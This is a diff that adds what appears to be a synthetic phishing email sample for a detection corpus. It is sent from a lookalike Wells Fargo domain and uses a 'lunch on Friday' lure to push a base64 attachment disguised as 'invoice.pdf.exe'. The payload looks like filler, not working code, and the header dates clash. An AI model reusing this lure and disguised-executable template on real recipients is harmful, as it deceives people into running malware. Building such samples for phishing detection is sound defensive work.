@@ -1,0 +1,48 @@
+From: notice@wells-fargo-alert.top
+To: victim46@example.com
+Subject: Lunch on Friday? [ref AF8E8C6]
+Date: Tue, 18 Mar 2002 12:59:00 -0500
+Message-ID: <phish-166-0c7a98dc-f270-4dfb-9e39-143577da99b5@wells-fargo-alert.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 08 Mar 2002 19:24:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 08 Mar 2002 00:34:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 17 Mar 2002 09:51:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 08 Mar 2002 07:53:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 23 Mar 2002 20:29:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 10 Mar 2002 19:05:00 -0500
+Return-Path: <notice@wells-fargo-alert.top>
+Reply-To: notice@wells-fargo-alert.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=wells-fargo-alert.top; dkim=pass header.d=wells-fargo-alert.top; dmarc=pass header.from=wells-fargo-alert.top
+Received-SPF: pass (mx.example.com: domain of notice@wells-fargo-alert.top designates 192.0.2.26 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=wells-fargo-alert.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-166-4f57dda"
+
+--bnd-p-166-4f57dda
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: AF8E8C6
+
+Thanks,
+Colleague
+--bnd-p-166-4f57dda
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQADo+LGKNChxiBXRoT7B5lAcT1VeCj46MJNOFlQaaCarFfId2B4/DZtudCezyiXcX5s6y6kkq
+PfLBFwru6K8gwlChs775HmQtBoJA6wbjZZuefflpiaPgfv7outXWRI6R/wJ3NmWXw9CZZZLSam6f
+UytgT5wbcQr/l5ZN9ik8Quh6SLsK0jBWpxVoZtRLdkxNYLOB8o6w8Kxcvw7KJQGljN0miiAuHYsX
+GcdGMtFNfhqPSFiiIm1DKFjju+bYLB1ehvd0zkcc06f6fRey1Uy5pA47HCNkkwncdTu0sU/1Jfz2
+r8YhNO3kuRRd1a0t1UGxIUgyUgAL7R4aOub0kut5VVqjMxUpL7FCWipUR/vkwaS7KWTqNn55p0xV
+Bc/reNmmJ7ZfWTUukiKfKIlAjqHJ35qhTq2IQdHix3yBjgKs4G1aS8oQdgslgSKf1+tRhaFiSI1w
+2wvqW4GVz8ffO85xytWnphIu4mjF0t7bxEiA7RRwnWNj6hXi7aEJROnsQDbZUhUPLVNDfZjUNUgo
+kaipQhcdtFWUxKcBzCirwdkeuXJ7eSjw/KeseLxnPax9+/vKLVvkGRr17Zr4zQbJgTKL35ipomlJ
+PhlkExSpmbOdWHv/JQ/mM914cpbRBmaxqwkGZCwccC+1rAyKoywE2iN/JQTdtfN5R4DSK5odmO8d
+LX9yzffqt1itInQYBglWcsbahq8p9kWgm5Vbotn/KU36HbqGBJcnI5sq+HF/q5WTQtuoUiVVwTIZ
+9OS7A641RPtrvEWc1ZVAtGuG82TPXiJBw0/yBqmo+1iwJowKb5oqV5LFDpvtbWKvaf7x9tm3u5NQ
+XaUl7iy4jACXxSzfLw==
+
+--bnd-p-166-4f57dda--
